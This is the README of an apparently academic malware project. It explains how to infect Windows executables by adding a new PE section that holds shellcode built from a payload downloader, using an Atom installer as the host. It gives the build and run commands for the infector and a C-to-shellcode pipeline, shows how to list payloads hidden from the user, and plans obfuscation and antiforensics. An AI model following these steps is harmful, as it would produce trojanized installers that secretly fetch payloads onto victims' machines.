# MALW-MCYBERS
## Infection
For the infection part we decided to use *New section* technique. This consits in adding a new section to a *.exe* file.

For this, we have the following files:
- InfectPE.cpp
- PE.cpp
- PE.h
- payload_downloader.cpp -> code that after will become the shellcode that will be injected in a legitimate exe file
- AtomSetup.exe -> The Atom installer infected

### Compilation

#### Infect a file
Put the shellcode inside the infectPE.cpp.
```sh
> g++ -c PE.cpp -std=c++17
> g++ -c InfectPE.cpp -std=c++17
> g++ -o InfectPE.exe InfectPE.o PE.o
> .\InfectPE.exe .\executable_to_infect.exe .\out.exe
```

#### List hidden payload
To list the payload, which will be hidden from the user:
```sh
> dir /R
```

#### Create shellcode
From C to assembly.
```sh
> ShellcodeCompiler_x64.exe -r Source.cpp -o Shellcode.bin -a assembly_code.asm -p win_x86
```
Assembly to shellcode.
```sh
$ nasm -f win32 assembly_code.asm 
$ objcopy -j .text -O binary assembly_code.obj temp_file.bin
$ hexdump -v -e '"\\" 1/1 "x%02x"' temp_file.bin
```

#### Run server
```sh
$ sudo node index.js
```

### To Do
- [X] Update downloaded file path and name
- [ ] Payload of exe file
- [ ] Obfuscation
- [ ] Antiforensics

### Old versions
```sh
> g++ -c processCreator.cpp
> g++ -o procesCreator.exe processCreator.o
> .\processCreator.exe executable_to_execute.exe

> g++ -c shellcodeExecuter.cpp
> g++ -o shellcodeExecuter.exe shellcodeExecuter.o
> .\shellcodeExecuter.exe
```
